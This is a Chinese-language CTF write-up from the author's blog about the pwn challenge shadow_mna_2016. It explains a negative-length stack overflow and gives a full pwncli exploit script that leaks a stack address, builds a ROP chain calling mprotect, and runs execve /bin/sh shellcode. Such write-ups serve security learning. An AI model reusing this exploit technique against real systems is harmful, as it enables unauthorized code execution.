# shadow_mna_2016



### 总结

自定义了一套函数调用流程，手动模拟了`push/pop/call/ret`等。分析清楚每个指令的实现后，即可利用栈上的变量进行利用。

<!-- more -->

### checksec

![image-20220404005927723](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404005927723.png)

远程环境不影响。

### 漏洞点

这里直接看汇编，更容易发现漏洞点。在`message`函数中：

![image-20220404010056116](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404010056116.png)

这里要输入`name`的时候，直接从栈上取的变量，可控制。

![image-20220404010211189](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404010211189.png)

长度可以位为负数，之后可以栈溢出。还可以发现，循环变量都是从栈上取的，也可以控制循环的次数。

### 利用思路

程序最后回到上一层使用的是：

![image-20220404010328837](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404010328837.png)

一开始的想法是控制这里的`ebp`，即可进行栈迁移。后来在写`exp`的过程中发现，在`getnline(name, xxx)`的时候，就已经可以`rop`了。

思路如下：

- 首先利用栈溢出泄露出`stack`地址
- 伪造`name`和`name_len`，读入`name`，触发`rop`
- 修改栈的可执行权限，执行`shellcode`即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


sla("Input name : ", "roderick")
sla("Message length : ", "-1")
sa("Input message : ", "a"*0x2b+"$")

ru("$")
m = rn(4)
stack_addr = u32_ex(m)
log_address_ex("stack_addr")

sla("Change name? (y/n) : ", "n")
sla("Message length : ", "-1")
sa("Input message : ", flat({
    0x20-4: [
        3, # i
        0,
        0,0,
        "dead", # *rbp
        0,
        stack_addr - 0xc4 - 0x60, # name
        0x1000, # name_len
        4 # let's try again
    ]
}))


payload = [
    elf.plt.mprotect,
    stack_addr - 0x80,
    (stack_addr - 0x104) & ~0xfff,
    0x2000,
    7,
    "\x90" * 0x100,
    ShellcodeMall.i386.execve_bin_sh
]

sla("Input name : ", flat({
    28:payload
}))

ia()
```

打远程：

![image-20220404010824023](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404010824023.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-04-04-shadow-mna-2016/  

